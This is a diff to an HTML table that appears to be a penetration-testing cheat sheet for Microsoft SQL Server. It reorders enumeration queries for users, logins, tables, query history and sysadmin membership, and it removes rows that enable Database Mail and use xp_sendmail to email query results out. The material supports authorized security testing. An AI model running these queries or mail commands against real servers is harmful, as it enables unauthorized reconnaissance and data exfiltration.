@@ -15,28 +15,32 @@
       <td>SELECT @@version;</td>
     </tr>
     <tr>
-      <td>Database Name</td>
-      <td>SELECT db_name();</td>
+      <td>User</td>
+      <td>SELECT user;<br>SELECT system_user;<br>SELECT user_name();<br>SELECT loginame from master..sysprocesses where spid = @@SPID</td>
+    </tr>
+    <tr>
+      <td>Users</td>
+      <td>SELECT name from master..syslogins</td>
+    </tr>
+    <tr>
+      <td>Tables</td>
+      <td>SELECT table_catalog, table_name FROM information_schema.columns</td>
+    </tr>
+    <tr>
+      <td>Columns</td>
+      <td>SELECT table_catalog, column_name FROM information_schema.columns</td>
     </tr>
     <tr>
       <td>Databases</td>
       <td>SELECT name from master..sysdatabases;</td>
     </tr>
     <tr>
+      <td>Database Name</td>
+      <td>SELECT db_name();</td>
+    </tr>
+    <tr>
       <td>Server Name</td>
       <td>SELECT @@SERVERNAME</td>
-    </tr>
-    <tr>
-      <td>Database Tables and Columns</td>
-      <td>SELECT table_name, column_name FROM information_schema.columns</td>
-    </tr>
-    <tr>
-      <td>Current Database User</td>
-      <td>SELECT user;<br>SELECT system_user;<br>SELECT user_name();<br>SELECT loginame from master..sysprocesses where spid = @@SPID</td>
-    </tr>
-    <tr>
-      <td>Users</td>
-      <td>SELECT name from master..syslogins</td>
     </tr>
     <tr>
       <td>Find Stored Procedures</td>
@@ -60,7 +64,7 @@
         t.target_set_id, t.TYPE, t.type_skeleton FROM msdb.dbo.syspolicy_policies p INNER JOIN syspolicy_conditions c ON p.condition_id = c.condition_id INNER JOIN msdb.dbo.syspolicy_target_sets t ON t.object_set_id = p.object_set_id</td>
     </tr>
     <tr>
-      <td>Get SQL Domain User</td>
+      <td>Domain User</td>
       <td><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/templates/tsql/Get-SQLDomainUser-Example.sql">https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/templates/tsql/Get-SQLDomainUser-Example.sql</a></td>
     </tr>
     <tr>
@@ -74,39 +78,19 @@
         s ON a.audit_guid = s.audit_guid JOIN sys.server_audit_specification_details AS d ON s.server_specification_id = d.server_specification_id</td>
     </tr>
     <tr>
-      <td>View queries run on the system</td>
+      <td>Query history</td>
       <td>SELECT * FROM (SELECT COALESCE(OBJECT_NAME(qt.objectid),'Ad-Hoc') AS objectname, qt.objectid as objectid, last_execution_time, execution_count, encrypted,<br/> (SELECT TOP 1 SUBSTRING(qt.TEXT,statement_start_offset / 2+1,( (CASE WHEN statement_end_offset
         = -1 THEN (LEN(CONVERT(NVARCHAR(MAX),qt.TEXT)) * 2) <br/>ELSE statement_end_offset END)- statement_start_offset) / 2+1)) AS sql_statement FROM sys.dm_exec_query_stats AS qs CROSS APPLY sys.dm_exec_sql_text(sql_handle) AS qt ) x ORDER BY execution_count
         DESC
       </td>
     </tr>
     <tr>
-      <td>List enabled audit specifications</td>
+      <td>Enabled audit specifications</td>
       <td><a href="https://gist.github.com/nullbind/5da8b5113da007ba0111" target="_blank" rel="noopener">https://gist.github.com/nullbind/5da8b5113da007ba0111</a></td>
     </tr>
     <tr>
       <td>Local Administrators in Sysadmin Role</td>
       <td>SELECT is_srvrolemember('sysadmin','BUILTIN\Administrators')</td>
-    </tr>
-    <tr>
-      <td>Enable database mail</td>
-      <td>sp_configure 'show advanced options', 1;RECONFIGURE;sp_configure 'Database Mail XPs', 1;RECONFIGURE;exec msdb..sp_send_dbmail @recipients='harold@netspi.com',@query='select @@version';</td>
-    </tr>
-    <tr>
-      <td>Basic xp_sendmail Query</td>
-      <td>EXEC master..xp_sendmail 'harold@netspi.com', 'This is a test.'</td>
-    </tr>
-    <tr>
-      <td>Send Full Email with xp_sendmail</td>
-      <td>EXEC xp_sendmail @recipients='harold@netspi.com',<br>@message='This is a test.',<br>@copy_recipients='test@netspi.com',<br>@subject='TEST'</td>
-    </tr>
-    <tr>
-      <td>Send Query Results Via xp_sendmail</td>
-      <td>EXEC xp_sendmail 'harold@netspi.com', @query='SELECT @@version';</td>
-    </tr>
-    <tr>
-      <td>Send Query Results as Attachment Via xp_sendmail</td>
-      <td>CREATE TABLE ##texttab (c1 text)<br>INSERT ##texttab values ('Put messge here.')<br>DECLARE @cmd varchar(56)<br>SET @cmd = 'SELECT c1 from ##texttab'<br>EXEC master.dbo.xp_sendmail 'robertk',<br>@query = @cmd, @no_header='TRUE'<br>DROP TABLE ##texttab</td>
     </tr>
     <tr>
       <td>Domain users and LDAP queries via database links and openrowset</td>
